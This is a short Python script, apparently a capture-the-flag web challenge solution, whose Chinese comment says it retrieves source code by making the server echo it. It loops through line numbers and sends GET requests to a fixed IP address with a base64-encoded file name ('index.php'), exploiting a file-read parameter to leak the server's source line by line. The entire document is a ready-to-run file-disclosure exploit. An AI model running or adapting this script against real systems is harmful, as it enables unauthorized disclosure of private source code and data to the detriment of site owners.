#获取源代码的脚本,用get 方式上传信息使其回显源代码
import requests
s = requests.session()
url = "http://123.206.87.240:8002/web11/index.php"
for i in range(1,30):
    playload = {'line':str(i),'filename':'aW5kZXgucGhw'}
    sc = requests.get(url,params=playload).content
    concent = str(sc,encoding='utf-8')
    print(concent)

